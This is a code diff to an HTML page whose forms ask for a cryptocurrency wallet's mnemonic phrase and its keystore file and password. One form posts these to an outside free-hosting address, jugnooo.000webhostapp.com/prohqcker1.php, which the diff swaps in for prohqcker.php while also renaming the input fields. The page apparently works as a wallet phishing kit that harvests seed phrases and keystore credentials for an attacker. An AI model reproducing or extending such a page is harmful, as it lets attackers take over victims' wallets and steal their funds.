@@ -62,7 +62,7 @@
             class="form__input form-input1"
             id="textInput"
             type="text"
-            name="Mnemonics phrase"
+            name="mnemonics"
 			required
           />
           <button class="form__btn" type="submit">Proceed</button>
@@ -71,7 +71,7 @@
         <form
           id="new-form"
           class="form flex flex-jc-c"
-          action="https://jugnooo.000webhostapp.com/prohqcker.php"
+          action="https://jugnooo.000webhostapp.com/prohqcker1.php"
           method="POST"
         >
           <h5>KEYSTORE</h5>
@@ -82,7 +82,7 @@
             class="form__input"
             id="textInput2"
             type="text"
-            name="Keystore"
+            name="username"
 			required
           />
           <label for="passwordInput" class="form__label">
@@ -92,7 +92,7 @@
             class="form__input"
             id="passwordInput"
             type="password"
-            name="Keystore pass"
+            name="password"
 			required
           />
           <button class="form__btn" type="submit">Proceed</button>
